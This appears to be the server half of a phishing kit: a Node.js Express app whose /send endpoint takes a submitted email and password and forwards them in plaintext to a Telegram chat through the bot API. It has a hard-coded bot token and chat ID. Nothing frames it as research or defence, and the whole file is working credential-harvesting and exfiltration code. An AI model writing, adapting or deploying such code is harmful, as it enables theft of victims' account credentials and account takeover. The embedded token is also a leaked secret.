const express = require("express");
const cors = require("cors");
const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static("."));

const BOT_TOKEN = "8520025440:AAEh1HWkv6QmOawXjqckH4JswLpthMo9ZGg"; // your BotFather token
const CHAT_ID = 6747227798; // your chat_id from getUpdates

app.post("/send", async (req, res) => {
  const { email, password } = req.body;

  const text =
    "🔐 Login Attempt\n" +
    "📧 Email: " + email + "\n" +
    "🔑 Password: " + password;

  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT_ID, text })
    });

    res.send("Sent ✅");
  } catch (err) {
    console.error(err);
    res.status(500).send("Error sending message");
  }
});

app.listen(3000, () => console.log("Server running on http://localhost:3000"));
